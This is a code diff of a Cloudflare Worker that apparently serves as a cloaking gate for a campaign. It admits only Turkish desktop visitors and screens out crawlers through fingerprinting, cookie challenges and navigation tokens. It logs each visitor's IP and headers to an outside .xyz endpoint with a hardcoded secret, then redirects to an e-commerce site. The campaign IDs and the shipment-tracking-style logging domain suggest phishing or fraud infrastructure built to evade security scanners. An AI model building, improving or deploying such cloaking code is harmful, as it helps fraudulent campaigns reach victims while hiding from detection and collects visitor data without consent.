@@ -3,7 +3,9 @@ addEventListener("fetch", event => {
 })
 
 async function handleRequest(request) {
+
   const url = new URL(request.url)
+  const method = request.method
   const userAgent = request.headers.get("user-agent") || ""
   const ip = request.headers.get("cf-connecting-ip") || ""
   const country = request.headers.get("cf-ipcountry") || "XX"
@@ -12,21 +14,31 @@ async function handleRequest(request) {
   const secChUa = request.headers.get("sec-ch-ua") || ""
   const referer = request.headers.get("referer") || ""
   const cookie = request.headers.get("cookie") || ""
+  const secFetchDest = request.headers.get("sec-fetch-dest") || ""
+  const secFetchMode = request.headers.get("sec-fetch-mode") || ""
 
   const TARGET_URL = "https:\/\/pazarama.com"
   const ALLOWED_COUNTRY = "TR"
   const ENABLED_BOT_FILTERS = ["headless","datacenter","ua","behavior","js_challenge","rate_limit","fingerprint"]
   const ENABLED_DEVICES = ["desktop"]
-  const CAMPAIGN_ID = "cmp_698d4b169c716"
+  const CAMPAIGN_ID = "cmp_698edbd861046"
   const LOG_ENDPOINT = "https:\/\/gonderisorgula.xyz\/api\/log_visit.php"
+  const WORKER_SECRET = "cok_guclu_uzun_random_bir_secret_123XYZ"
 
   let detectedBy = null
+  let logSent = false
 
   async function sendLog(isBot, filterHit = null) {
+    if (logSent) return
+    logSent = true
+
     try {
       await fetch(LOG_ENDPOINT, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json",
+          "X-Worker-Secret": WORKER_SECRET
+        },
         body: JSON.stringify({
           campaign_id: CAMPAIGN_ID,
           ip: ip,
@@ -60,74 +72,11 @@ async function handleRequest(request) {
       }
     }
 
-    if (ENABLED_BOT_FILTERS.includes("behavior")) {
-      if (request.headers.get("cf-cache-status") === "HIT") {
-        detectedBy = "behavior"
-        return true
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("automation_flags")) {
-      if (/webdriver|playwright|automation/i.test(userAgent)) {
-        detectedBy = "automation_flags"
-        return true
-      }
-    }
-
     if (ENABLED_BOT_FILTERS.includes("accept_mismatch")) {
       if (!accept.includes("text/html")) {
         detectedBy = "accept_mismatch"
         return true
       }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("suspicious_referer")) {
-      if (referer && !referer.startsWith("https://") && !referer.startsWith("http://")) {
-        detectedBy = "suspicious_referer"
-        return true
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("ip_entropy")) {
-      if (/^(\d+)\.\1\.\1\.\1$/.test(ip)) {
-        detectedBy = "ip_entropy"
-        return true
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("js_challenge")) {
-      if (!cookie.includes("verified=true")) {
-        detectedBy = "js_challenge"
-        return new Response(
-          "<html><body><script>document.cookie='verified=true; path=/'; location.reload();</script></body></html>",
-          { headers: { "Content-Type": "text/html" } }
-        )
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("rate_limit")) {
-      const key = ip
-      if (!globalThis.__rateMap) globalThis.__rateMap = {}
-      const now = Date.now()
-      const windowMs = 5000
-      const maxReq = 10
-      if (!globalThis.__rateMap[key]) globalThis.__rateMap[key] = []
-      globalThis.__rateMap[key] = globalThis.__rateMap[key].filter(t => now - t < windowMs)
-      globalThis.__rateMap[key].push(now)
-      if (globalThis.__rateMap[key].length > maxReq) {
-        detectedBy = "rate_limit"
-        return true
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("fingerprint")) {
-      const fingerprint = userAgent + accept + acceptLang + secChUa
-      if (!globalThis.__fpMap) globalThis.__fpMap = {}
-      if (globalThis.__fpMap[fingerprint]) {
-        detectedBy = "fingerprint"
-        return true
-      }
-      globalThis.__fpMap[fingerprint] = true
     }
 
     if (ENABLED_BOT_FILTERS.includes("header_consistency")) {
@@ -136,30 +85,44 @@ async function handleRequest(request) {
         return true
       }
     }
-
-    if (ENABLED_BOT_FILTERS.includes("tls_fingerprint")) {
-      if (!request.cf || !request.cf.tlsCipher) {
-        detectedBy = "tls_fingerprint"
-        return true
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("entropy")) {
-      if (!cookie.includes("human=true")) {
-        detectedBy = "entropy"
-        return new Response(
-          "<html><body><script>document.cookie='human=true; path=/';</script></body></html>",
-          { headers: { "Content-Type": "text/html" } }
-        )
-      }
-    }
-
-    if (ENABLED_BOT_FILTERS.includes("navigation_flow")) {
-      if (!referer) {
-        detectedBy = "navigation_flow"
-        return true
-      }
-    }
+	
+	if (ENABLED_BOT_FILTERS.includes("navigation_token")) {
+	  const token = url.searchParams.get("nv")
+	  if (!token) {
+		const newUrl = new URL(request.url)
+		newUrl.searchParams.set("nv", crypto.randomUUID())
+		return Response.redirect(newUrl.toString(), 302)
+	  }
+	}
+	
+	if (ENABLED_BOT_FILTERS.includes("behavioral_delay")) {
+	  if (!globalThis.__delayMap) globalThis.__delayMap = {}
+	  const now = Date.now()
+	  if (globalThis.__delayMap[ip] && now - globalThis.__delayMap[ip] < 300) {
+		detectedBy = "behavioral_delay"
+		return true
+	  }
+	  globalThis.__delayMap[ip] = now
+	}
+	
+	if (ENABLED_BOT_FILTERS.includes("advanced_js")) {
+	  if (!cookie.includes("adv_verified=true")) {
+		return new Response(
+		  "<html><body><script>setTimeout(()=>{document.cookie='adv_verified=true; path=/'; location.reload();},300);</script></body></html>",
+		  { headers: { "Content-Type": "text/html" } }
+		)
+	  }
+	}
+	
+	if (ENABLED_BOT_FILTERS.includes("fingerprint_v2")) {
+	  const fp = userAgent + accept + acceptLang + secChUa
+	  if (!globalThis.__fpv2) globalThis.__fpv2 = {}
+	  if (globalThis.__fpv2[fp]) {
+		detectedBy = "fingerprint_v2"
+		return true
+	  }
+	  globalThis.__fpv2[fp] = true
+	}
 
     return false
   }
@@ -175,17 +138,18 @@ async function handleRequest(request) {
     return false
   }
 
+  // ✅ SADECE GERÇEK SAYFA NAVIGATION LOG ATAR
+  const isRealPageVisit =
+    method === "GET" &&
+    accept.includes("text/html") &&
+    (secFetchDest === "document" || secFetchMode === "navigate")
+
   if (country !== ALLOWED_COUNTRY) {
     await sendLog(true, "country")
     return new Response("Access denied.", { status: 403 })
   }
 
   const botResult = isBot()
-  if (botResult instanceof Response) {
-    await sendLog(false, "js_challenge")
-    return botResult
-  }
-
   if (botResult === true) {
     await sendLog(true, detectedBy)
     return new Response("Bot traffic blocked.", {
@@ -199,6 +163,19 @@ async function handleRequest(request) {
     return new Response("Device not allowed.", { status: 403 })
   }
 
-  await sendLog(false, null)
+  // 🔥 İnsan logu TEK KERE atılacak şekilde revize edildi
+  if (isRealPageVisit) {
+    const hasNavToken = !ENABLED_BOT_FILTERS.includes("navigation_token") 
+      || url.searchParams.get("nv")
+
+    const hasAdvancedCookie = !ENABLED_BOT_FILTERS.includes("advanced_js") 
+      || cookie.includes("adv_verified=true")
+
+    if (hasNavToken && hasAdvancedCookie) {
+      await sendLog(false, null)
+    }
+  }
+
   return Response.redirect(TARGET_URL, 302)
+
 }
